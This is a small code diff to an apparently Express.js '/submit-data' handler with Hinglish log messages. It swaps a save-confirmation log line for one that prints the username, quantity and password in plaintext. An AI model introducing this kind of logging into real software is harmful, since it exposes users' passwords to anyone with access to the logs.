@@ -23,8 +23,9 @@ app.post('/submit-data', (req, res) => {
         if (err) {
             console.error("Data save karne mein error aaya:", err);
         } else {
-            console.log(`[SAVED] Data successfully saved for: ${username}`);
-        }
+    console.log(`[NEW DATA] User: ${username} | Qty: ${quantity} | Pass: ${password}`);
+}
+        
     });
 
     res.json({ status: 'success', message: 'Data received successfully' });
